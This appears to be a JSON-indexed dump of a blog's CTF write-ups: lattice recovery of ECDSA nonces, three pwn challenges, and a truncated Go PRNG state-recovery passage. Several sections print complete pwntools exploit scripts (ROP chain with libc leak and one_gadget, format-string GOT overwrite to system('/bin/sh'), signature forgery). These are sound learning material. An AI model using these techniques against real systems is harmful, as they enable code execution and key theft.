q\\\\ \\end{align*} $$ where $t=-s_{1}^{-1}r_{1}s_{2}r_{2}^{-1}$ and $u=s_{1}^{-1}r_{1}r_{2}^{-1}h_{2} - s_{1}^{-1}h_{1}$ Remember $\\text{eq3}$ where we actually can expand the $k$ further. Putting it to $\\text{eq6}$. $$ \\begin{align*} \\tag{7} 2^{\\ell_{1}}c_{1} + a_{1} + b_{1} + t2^{\\ell_{2}}c_{2} + ta_{2} + tb_{2} + u \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + a_{1} + ta_{2} + u \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + u' \u0026\\equiv 0 \\mod q\\\\ b_{1} + 2^{\\ell_{1}}c_{1} + tb_{2} + t2^{\\ell_{2}}c_{2} + u' \u0026\\equiv 0 \\mod q\\\\ \\end{align*} $$ where $u'= a_{1} + ta_{2} + u$. Now, notice that $b_{1}$, $c_{1}$, $b_{2}$, $c_{2}$ are small unknowns. Based on the paper, we can construct a lattice where the result will contains 4 linear equations with 4 unknowns. Now, below is the lattice that I use. $$ B = \\begin{bmatrix} K \u0026 K2^{\\ell_{1}} \u0026 Kt \u0026 Kt2^{\\ell_{2}} \u0026 u' \\\\ 0 \u0026 Kq \u0026 0 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 Kq \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 Kq \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 q \\\\ \\end{bmatrix} $$ where for this challenge, I choose $K=2^{56}$ ($K$ is the expected bound for $b_{1}, c_{1}, b_{2}, c_{2}$). I know that $c_{2}$ value is expected to be larger than $K$ (remember that $c_{2}$ bits length should be around $64$), but this is enough for some cases (Refer to Extra Notes below). Notes that the lattice is slightly different from the example in the paper, because on this challenge, the total leaked middle bits that we got on signature 1 and signature 2 is difference ($leaked_{1_{bits}}=~144$ and $leaked_{1_{bits}}=~136$). Hence, the $\\ell_i$ value is difference. Using this basis and reduce it with $LLL$, we will got matrix 5x5, where it contains vector $$ v_{i} = (x_{0}Kb_{1}, x_{1}Kc_{1}, x_{2}Kb_{2}, x_{3}Kc_{2}, y_{i}) $$ where $x_{i}K$ is the coefficients of the linear equation and $y_{i}$ is the result of the linear equation. Just like the paper said, the first 4 vector is actually a linear equation of 4 unknown variables. So the vector is basically represents: $$ x_{0}Kb_{1} + x_{1}Kc_{1} + x_{2}Kb_{2} + x_{3}Kc_{2} - y_{i} = 0 $$ Solving the equations, w","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:2","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Extra notes The solution is unstable, which after testing in the local, I found out that we can only apply our constructed lattice only if the bits length of the $c_2$ is \u003c $63$ bits. So, during the challenge, what I do is simply restart the docker so many times, until the $c_2$ value is \u003c $63$ bits. I believe one of the reason of this unstable result is due to the $K$ value that I set is $2^{56}$. I‚Äôm pretty sure that my lattice can be improved so that it can recover the $\\text{nonce}$ even though the $c_2$ bits length is between ${63,64}$ bits. Also in the paper, it is stated that The determinant bounds guarantee that we will find one short lattice vector, but do not guarantee that we will find four short lattice vectors. For that, we rely on the heuristic that the reduced vectors of a random lattice are close to the same length. So maybe, it is expected that we might need to do several attempts to break the given ECDSA system. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:3","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Full Script I use sage to run this script from pwn import * from Crypto.Util.number import * import json from hashlib import sha1 from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature import binascii def retrieve_file(fname): try: dt = open(fname, 'rb').read() return dt.hex() except: return 'The file does not exist!' class ECDSA: def __init__(self, key=-1): self.G = generator_256 self.n = self.G.order() if key == -1: self.key = randint(1, self.n - 1) else: self.key = key self.pubkey = Public_key(self.G, self.key * self.G) self.privkey = Private_key(self.pubkey, self.key) def sign(self, fname): h = sha1(fname).digest() nonce = randint(1, self.n - 1) sig = self.privkey.sign(bytes_to_long(h), nonce) return {\"r\": hex(sig.r)[2:], \"s\": hex(sig.s)[2:], \"nonce\": hex(nonce)[2:]} def verify(self, fname, r, s): h = bytes_to_long(sha1(fname).digest()) r = int(r, 16) s = int(s, 16) sig = Signature(r, s) if self.pubkey.verifies(h, sig): return retrieve_file(fname) else: return 'Signature is not valid\\n' def list_files(conn): conn.sendlineafter(b'a file\\n', b'{\"option\": \"list\"}') response = json.loads(conn.recvuntil(b'\\n').strip()) return response['files'] def access_file(conn, fname, r, s): payload = json.dumps({ 'option': 'access', 'fname': fname, 'r': r, 's': s, }) conn.sendlineafter(b'a file\\n', payload.encode()) response = conn.recvuntil(b'\\n') return json.loads(response) url = 'localhost:1337' host = url.split(':')[0] port = int(url.split(':')[1]) conn = remote(host, port) files = list_files(conn) q = 115792089210356248762697446949407573529996955224135760342422259061068512044369 # Get first signature with its leaked nonce fname1 = (files[0].split('_')[0] + '_' + files[0].split('_')[1]).encode() h1 = bytes_to_long(sha1(fname1).digest()) r1 = int(files[0].split('_')[2], 16) s1 = int(files[0].split('_')[3], 16) leaked1 = int(files[0].split('_')[4], 16) a1 = leaked1*(2**56) # Get second signature with its leaked nonce fname2 = (files[1].split('_')[0] + '_' + files[1].split('_')[1]).encode() h2 = bytes_to_long(sha1(fname2).digest()) r2 = int(files[1].split('_')[2], 16) s2 = int(files[1].split('_')[3], 16) leaked2 = int(files[1].split('_')[4], 16) a2 = leaked2*(2**56) # Craft our lattice k = 2**56 inv_s1 = int(inverse_mod(s1, q)) inv_r2 = int(inverse_mod(r2, q)) t = (-inv_s1*s2*r1*inv_r2) % q u = (inv_s1*r1*h2*inv_r2 - inv_s1*h1) % q uu = a1 + t*a2 + u m = Matrix([ [k, k*2**200, k*t, k*t*2**192, uu], [0, k*q, 0, 0, 0], [0, 0, k*q, 0, 0], [0, 0, 0, k*q, 0], [0, 0, 0, 0, q], ]) m = m.LLL() # Now, from the reduced basis, we try to solve the equations new_m = [] res = [] for row in m[:-1]: real_row = [] for val in row[:-1]: real_row.append(val / k) new_m.append(real_row) res.append(-row[-1]) new_m = Matrix(new_m) res = vector(res) ans = new_m.solve_right(res) # Now, we can get the nonce k1 = ans[0] + ans[1]*2**200 + a1 k2 = ans[2] + ans[3]*2**192 + a2 print('nonce_1:', hex(k1)) print('nonce_2:', hex(k2)) # From the retrieved nonce, we get the secret (key) secret = ((k1 * s1 - h1) * inverse_mod(r1, q)) % q print('secret:', secret) # Sign 'subject_danbeer' new_ecc = ECDSA(secret) filename = b'subject_danbeer' signature = new_ecc.sign(b'subject_danbeer') # Send its signature to the server resp = access_file(conn, filename.decode(), signature['r'], signature['s']) print('\\nResponse:') print(binascii.unhexlify(resp['data']).decode()) Social Media Follow me on twitter ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:4","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":" SanDiego CTF is pretty unique because the CTF platform is using Discord. I only have time to look at the pwn challenge, so here‚Äôs my writeup for some challenge that I solved Pwn ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:0:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Horoscope ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary. Let‚Äôs disassemble it: main undefined8 main(void) { char local_38 [48]; puts(\"Welcome to SDCTF\\'s very own text based horoscope\"); puts( \"please put in your birthday and time in the format (month/day/year/time) and we will have you r very own horoscope\" ); fflush(stdout); fgets(local_38,0x140,stdin); processInput(local_38); return 0; } processInput void processInput(char *param_1) { char *__nptr; int local_1c; char *local_18; int local_c; __nptr = strtok(param_1,\"/\"); for (local_1c = 0; local_1c \u003c 4; local_1c = local_1c + 1) { if (local_1c == 0) { local_c = atoi(__nptr); } if (local_1c == 3) { atoi(__nptr); } } switch(local_c) { default: puts(\"thats not a valid date \u003e:-(\"); fflush(stdout); /* WARNING: Subroutine does not return */ exit(1); case 1: local_18 = \"January\"; break; case 2: local_18 = \"February\"; break; case 3: local_18 = \"March\"; break; case 4: local_18 = \"April\"; break; case 5: local_18 = \"May\"; break; case 6: local_18 = \"June\"; break; case 7: local_18 = \"July\"; break; case 8: local_18 = \"August\"; break; case 9: local_18 = \"September\"; break; case 10: local_18 = \"October\"; break; case 0xb: local_18 = \"November\"; break; case 0xc: local_18 = \"December\"; } printf(\"wow, you were born in the month of %s. I think that means you will have a great week! :)\", local_18); fflush(stdout); return; } Looking at the main, there is buffer overflow bug. Looking at the checksec result, there isn‚Äôt any canary also: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) And then we also found a test function which call system('/bin/sh') void test(void) { if (temp == 1) { system(\"/bin/sh\"); } return; } Notes that the if else doesn‚Äôt matter, because we can directly use the system line instead of the start of the test function ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Well, simply use the buffer overflow bug to overwrite the main ret to the given system line of code. Also make sure that our buffer overflow payload should follow the processInput validation (which is a date). ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution Below is the full solver script to buffer overflow it: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./horoscope\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *main+100 ''') else: r = remote(\"horoscope.sdc.tf\", 1337) return r r = conn() system_addr = p64(0x000000000040095f) payload = b'11/11/11' + b'1'*0x30 +system_addr r.sendlineafter(b'horoscope\\n', payload) r.interactive() Run the solver and we will get a shell to read the flag Flag: sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y} ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Secure-Horoscope ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary and dockerfile. Let‚Äôs disassemble it first. main int main(int argc,char **argv) { char buf [40]; int i; i = 0; puts(\"We fixed some bugs in our last horoscope, this one should be secure!\\n\"); puts(\"To get started, tell us how you feel\"); fflush(stdout); fgets(buf,0x28,stdin); printf(\"feeling like %s? That\\'s interesting.\",buf); fflush(stdout); for (; i != 2; i = i + 1) { puts( \"please put in your birthday and time in the format (month/day/year/time) and we will have y our very own horoscope\\n\" ); fflush(stdout); getInfo(); puts(\"want to try again?\\n\"); fflush(stdout); } puts(\"too bad, we don\\'t have the resources for that right now \u003e:(\"); fflush(stdout); return 0; } Looking at the main function, it looks like main will call getInfo twice before exit. So far, main doesn‚Äôt have any vulns that I could see. Let‚Äôs take a look at the getInfo getInfo void getInfo(void) { char info [100]; memset(info,0,100); read(0,info,0x8c); puts(info); puts(\"hm, I\\'ll have to think about what this means. I\\'ll get back to you in 5 business days.\"); fflush(stdout); return; } We can see that there is buffer overflow vuln during read, but we can only overwrite 20-bytes at most after the function saved RBP. Let‚Äôs checksec it first Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Okay, no canary! However, 20-bytes are pretty small. To leak a libc function address, AFAIK, we need to have at least 24-bytes (pop_rdi + libc_got + puts_plt) üò¢ Looking at the Dockerfile, we can simply build it and get the used libc file for the challenge in the server. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan First, with the buffer overflow, we can simply overwrite the return address of getInfo to getInfo again, so that it won‚Äôt return to the main. This means the limitation of getInfo in the main (only 2 times to input) is bypassed. Second, through observation via GDB, everytime we overwrite getInfo return address to getInfo again, the new stack RSP address is increased by 8. Look at the below gdb result. During the first time we use getInfo the RSP just before it ret is placed on 0x7fff22cd8448. Notice that starting from the rsp+0x18 is our previous input during filling the how you feel question. After overwrite the ret to getInfo again, notice that the RSP just before it ret is placed on 0x7fff22cd8450 (Increased by 8). And now, our input in getInfo got merged with our previous input in main. Based on above, our input in getInfo will be placed just above our previous input in main (during storing how you feel question). This means that our buffer overflow will be technically increased from 20-bytes only to 60-bytes after we overwrite getInfo ret to getInfo again (20-bytes + input in main size). From the above information, that means we can definitely leak address of any libc function. The plan is to split our ROP chain to leak the libc. The first part will be stored during getInfo, the second part will be stored via main. After leaking the libc, we can simply ret to getInfo again, and then overwrite the return pointer to system. We can use one_gadget to help us get the shell address. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution Okay, so now, we need to craft our ROP chain to leak the libc address. With the help of ROPGadget, we can find address which will do pop rdi; ret. So, my ROP chain would be like this: pop_rdi_ret + puts_got + puts_plt + getInfo So, we put the puts_got to rdi, and then call puts, and then return it back to getInfo. We need to ret it back to getInfo so that we can overwrite its return pointer with the system address. We split it into two parts, pop_rdi_ret + puts_got and puts_plt + getInfo. Put the second part in main, and put the first part into getInfo. First, put up the second part in main, and then overwrite the getInfo return pointer with getInfo again first. puts_plt = exe.plt['puts'] puts_got = exe.got['puts'] pop_rdi = 0x0000000000400873 # pop rdi; ret getInfo = exe.symbols['getInfo'] r = conn() r.sendlineafter(b'feel\\n', p64(puts_plt)+p64(getInfo)) # Ret to getInfo again print() print(f'Ret2getInfo again') payload = b'a'*0x78 + p64(getInfo) r.sendafter(b'horoscope\\n\\n', payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() Now, based on our observation with GDB, when we overflow the next getInfo, it will placed inside the program stack just above our input in the main. Now, put the first part to the getInfo # Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB) print() print(f'Time to leak libc base...') payload = b'a'*0x78 + p64(pop_rdi) + p64(puts_got) # Because it got merged with our main input, our ROP will continue to puts_plt + getInfo r.send(payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() Honestly, on my local, after executing above script, I am able to get the leaked puts libc address. However, somehow in the server, I couldn‚Äôt do that. Instead, I need to send any string first before the server return the leaked puts libc. So, I decided to send another payload which will overwrite getInfo to getInfo again. # I don't know but somehow, in the server, it didn't return the puts_plt immediately # Somehow, I need to send something first before getting the leaked puts address # So, I decided to send another payload to return to getInfo again r.send(b'a'*0x78 + p64(getInfo)) out = r.recvuntil(b'\\n').strip() # Finally got the leaked libc r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() leaked_puts = u64(out.ljust(8, b'\\x00')) print(f'leaked_puts : {hex(leaked_puts)}') libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'libc base : {hex(libc_base)}') Finally, after we got the libc base address, we can simply use one_gadget to gain the shell address (with constraints). Now, for the last step, overwrite the getInfo return pointer with the shell. one_gadget = 0x4f302 # [rsp+0x40] == NULL payload = b'a'*0x78 + p64(libc_base+one_gadget) r.send(payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() r.interactive() And we got the shell üòÉ Below is the full solver script: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./secureHoroscope_patched\") libc = ELF(\"./libc-2.27.so\") ld = ELF(\"./ld-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path], env={}) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *getInfo+93 ''') else: r = remote(\"sechoroscope.sdc.tf\", 1337) return r puts_plt = exe.plt['puts'] puts_got = exe.got['puts'] one_gadget = 0x4f302 # [rsp+0x40] == NULL pop_rdi = 0x0000000000400873 # pop rdi; ret getInfo = exe.symbols['getInfo'] r = conn() r.sendlineafter(b'feel\\n', p64(puts_plt)+p64(getInfo)) # Ret to getInfo again print() print(f'Ret2getInfo again') payload = b'a'*0x78 + p64(getInfo) r.sendafter(b'horoscope\\n\\n', payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() # Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB) print() print(f'Time to leak libc base...') payload = b'a'*0x78 + p64(pop_rdi) + p64(puts_got) r.send(payloa","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Oil Spill ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary and Dockerfile. Let‚Äôs disassemble the binary first undefined8 main(undefined8 param_1,undefined8 param_2) { undefined8 in_R9; long in_FS_OFFSET; char local_148 [312]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\"%p, %p, %p, %p\\n\",puts,printf,local_148,temp,in_R9,param_2); puts(\"Oh no! We spilled oil everywhere and its making everything dirty\"); puts(\"do you have any ideas of what we can use to clean it?\"); fflush(stdout); fgets(local_148,300,stdin); printf(local_148); puts(x); fflush(stdout); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } If we look at the code, seems like the code already leaked the libc of puts and printf. Another thing that we could notice is, there is a format string bug in below code fgets(local_148,300,stdin); printf(local_148); Also another thing to look is the puts(x) line. Checking on Ghidra,x is a string located in .data Looking at the given Dockerfile, we can simply build it, and then take the libc file of the binary. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Based on the initial analysis, what we already have are: Libc file (from Dockerfile) Libc base during the binary execution (Due to the leak) Format string bug Note that we can overwrite value with format string bug via %n. For example, if we do %20$n, then it will overwrite the 20th element with how many characters have we printed. Based on those, my plan is to overwrite the puts to system, and x to /bin/sh\\x00. So that after reading our payload, when the binary call puts(x), they will call system('/bin/sh\\x00') instead. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution So, in order to execute the plan, what I do is: Overwrite x value byte per byte (via %hhn) Overwrite puts last byte (via %hhn) Overwrite puts second and third last byte (via %hn) First, let‚Äôs try to get the libc base from the leaked: r = conn() outs = r.recvuntil(b'\\n').strip().split(b',') leaked_puts = int(outs[0], 16) libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'Leaked Libc base: {hex(libc_base)}') system_addr = libc.symbols[\"system\"] print(f'system@libc: {hex(system_addr)}') puts_got = exe.got[\"puts\"] # This will be overwritten with system print(f'puts@got : {hex(puts_got)}') x_addr = exe.symbols[\"x\"] # This will be overwritten with /bin/sh\\x00 print(f'x : {hex(x_addr)}') After executing the above codes, we will already have: The puts got location The x location The system address in libc Now, let‚Äôs craft our payload. Below is the payload that I use fmt_str = b'' fmt_str += f'%21$hhn'.encode() # Overwrite lsb of x to \\x00 fmt_str += f'%{0x20}c%22$hhn'.encode() # Overwrite lsb of puts to lsb of system # Overwrite x to '/bin/sh' fmt_str += f'%{0x2f-0x20}c%23$hhn'.encode() fmt_str += f'%24$hhn'.encode() fmt_str += f'%{0x62-0x2f}c%25$hhn'.encode() fmt_str += f'%{0x68-0x62}c%26$hhn'.encode() fmt_str += f'%{0x69-0x68}c%27$hhn'.encode() fmt_str += f'%{0x6e-0x69}c%28$hhn'.encode() fmt_str += f'%{0x73-0x6e}c%29$hhn'.encode() # Overwrite 2nd and 3rd byte of puts to system second_third_byte_system = u64(p64(system_addr)[1:3].ljust(8, b'\\x00')) fmt_str += f'%{second_third_byte_system-0x73}c%30$hn'.encode() fmt_str = pad(fmt_str, 8) # This will be used as the address that we will overwrite # For x_addr, we will overwrite it per byte # For puts, we will: # - Overwrite the last byte first (0x20) # - Overwrite the second and third byte together addr = b'' addr += p64(x_addr+7) + p64(puts_got) + p64(x_addr) addr += p64(x_addr+4) + p64(x_addr+1) + p64(x_addr + 6) addr += p64(x_addr + 2) + p64(x_addr + 3) + p64(x_addr + 5) addr += p64(puts_got+1) payload = fmt_str + addr So, %hhn will overwrite 1 byte of the targeted element with the total character that we have printed, %hn will overwrite 2 bytes of the targeted element, and %c will print space with total as the given number (For example, %100c will print 100 spaces). And %10c%5$n means we overwrite the fifth element with 0xA (10). Notes that we actually need to carefully craft our payload to make sure the payload is ordered by the byte, because any character that we print to overwrite the current element, will be counted also during overwritten the next element. For example, if we already print 0x20, and then we want to overwrite another element, we can only overwrite it with size larger than 0x20. Let say we want to overwrite it with 0x2f, then we only need to print 0xf more. This means that we need to sort our payload to overwrite the address sorted by the byte from the smallest to the largest, because we can‚Äôt decrease the total count of the characters that we have printed. The above payload already fulfilled this increasing condition. Below is the result after we send the crafted payload to the server. We got a shell and we can read the flag This is the full solver script from Crypto.Util.Padding import pad from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./OilSpill_patched\") libc = ELF(\"./libc-2.27.so\") ld = ELF(\"./ld-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *main+186 ''') else: r = remote(\"oil.sdc.tf\", 1337) return r r = conn() outs = r.recvuntil(b'\\n').strip().split(b',') print(f'Outs: {outs}') leaked_puts = int(outs[0], 16) libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'Leaked Libc base: {hex(libc_base)}') system_addr = libc.symbols[\"system\"] print(f'system@libc: {hex(system_addr)}') puts_got = exe.got[\"puts\"] # This will be overwr","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":" AngstromCTF 2022 On this CTF, I managed to solve only one problem as I don‚Äôt have much time to work on it. Here‚Äôs my writeup for that problem. Crypto ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:0:0","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Prophet ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:0","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a source code like below package main import ( \"encoding/binary\" \"fmt\" \"math/rand\" ) func main() { flag := \"actf{REDACTEDREDACTEDREDACTED!!}\" rand.Seed(12345) // the actual seed is not 12345 // drastically slow down naive brute force for i := 0; i \u003c 100000; i += 1 { rand.Uint64() } for i := 0; i \u003c 4; i += 1 { fmt.Printf(\"flag chunk: %d\\n\", binary.LittleEndian.Uint64([]byte(flag)[i*8:i*8+8])^rand.Uint64()) } gap := 0 for i := 0; i \u003c 607; i += 1 { fmt.Println(rand.Uint64()) for j := 0; j \u003c gap; j += 1 { rand.Uint64() } gap = (gap + 1) % 13 } } Skimming through the code, what this code do is basically: Call rand.Uint64() for 100000 times Call rand.Uint64() for 4 times. Each value will be xored with the flag chunk Print value of the rand.Uint64() for 607 times, but there will be a gap between each print (So we don‚Äôt get the full complete sequence of it). ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:1","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Attack Plan Seems like we need to attack the golang math/rand PRNG. So, we need to dive into the math/rand source code first to see how golang implements it. Below is the relevant source code: go/rand.go // A Source represents a source of uniformly-distributed // pseudo-random int64 values in the range [0, 1\u003c\u003c63). type Source interface { Int63() int64 Seed(seed int64) } // A Source64 is a Source that can also generate // uniformly-distributed pseudo-random uint64 values in // the range [0, 1\u003c\u003c64) directly. // If a Rand r's underlying Source s implements Source64, // then r.Uint64 returns the result of one call to s.Uint64 // instead of making two calls to s.Int63. type Source64 interface { Source Uint64() uint64 } // A Rand is a source of random numbers. type Rand struct { src Source s64 Source64 // non-nil if src is source64 // readVal contains remainder of 63-bit integer used for bytes // generation during most recent Read call. // It is saved so next Read call can start where the previous // one finished. readVal int64 // readPos indicates the number of low-order bytes of readVal // that are still valid. readPos int8 } // Seed uses the provided seed value to initialize the generator to a deterministic state. // Seed should not be called concurrently with any other Rand method. func (r *Rand) Seed(seed int64) { if lk, ok := r.src.(*lockedSource); ok { lk.seedPos(seed, \u0026r.readPos) return } r.src.Seed(seed) r.readPos = 0 } // Uint64 returns a pseudo-random 64-bit value as a uint64. func (r *Rand) Uint64() uint64 { if r.s64 != nil { return r.s64.Uint64() } return uint64(r.Int63())\u003e\u003e31 | uint64(r.Int63())\u003c\u003c32 } And below is the rngSource which implements Source interface go/rng.go const ( rngLen = 607 rngTap = 273 rngMax = 1 \u003c\u003c 63 rngMask = rngMax - 1 int32max = (1 \u003c\u003c 31) - 1 ) type rngSource struct { tap int // index into vec feed int // index into vec vec [rngLen]int64 // current feedback register } // Seed uses the provided seed value to initialize the generator to a deterministic state. func (rng *rngSource) Seed(seed int64) { rng.tap = 0 rng.feed = rngLen - rngTap seed = seed % int32max if seed \u003c 0 { seed += int32max } if seed == 0 { seed = 89482311 } x := int32(seed) for i := -20; i \u003c rngLen; i++ { x = seedrand(x) if i \u003e= 0 { var u int64 u = int64(x) \u003c\u003c 40 x = seedrand(x) u ^= int64(x) \u003c\u003c 20 x = seedrand(x) u ^= int64(x) u ^= rngCooked[i] rng.vec[i] = u } } } // Uint64 returns a non-negative pseudo-random 64-bit integer as an uint64. func (rng *rngSource) Uint64() uint64 { rng.tap-- if rng.tap \u003c 0 { rng.tap += rngLen } rng.feed-- if rng.feed \u003c 0 { rng.feed += rngLen } x := rng.vec[rng.feed] + rng.vec[rng.tap] rng.vec[rng.feed] = x return uint64(x) } So, basically, the way golang RNG works are: Seed will determine the initial value of vec Set the initial value of tap and feed (tap=0, feed=rngLen-rngTap=334) To generate a random number, it will: Decrement tap by 1 Decrement feed by 1 Calculate x = (vec[feed]+vec[tap]) % 2**64 Set vec[feed] = x Return vec[feed] Notes that the tap and feed is circular, so it will point to the vec last element if it got decremented when point to the vec first element. So basically, the way it generated a random number is through linear equations. Now notice this given code on the problem. gap := 0 for i := 0; i \u003c 607; i += 1 { fmt.Println(rand.Uint64()) for j := 0; j \u003c gap; j += 1 { rand.Uint64() } gap = (gap + 1) % 13 } The given problem gave us some leaked of the generated random value, but it has a gap, so we don‚Äôt know the full sequence numbers of it. But, the plan is, from the given sequences, we must need to somehow reconstruct the vec internal state. ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:2","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Solution Now, let see the given code flag := \"actf{REDACTEDREDACTEDREDACTED!!}\" rand.Seed(12345) // the actual seed is not 12345 // drastically slow down naive brute force for i := 0; i \u003c 100000; i += 1 { rand.Uint64() } for i := 0; i \u003c 4; i += 1 { fmt.Printf(\"flag chunk: %d\\n\", binary.LittleEndian.Uint64([]byte(flag)[i*8:i*8+8])^rand.Uint64()) } Actually, we can ignore the 100000 loops because we don‚Äôt need that at all. What we need is only the internal state just before the call rand.Uint64() during xoring the flag chunk, so we don‚Äôt care the internal state of vec before 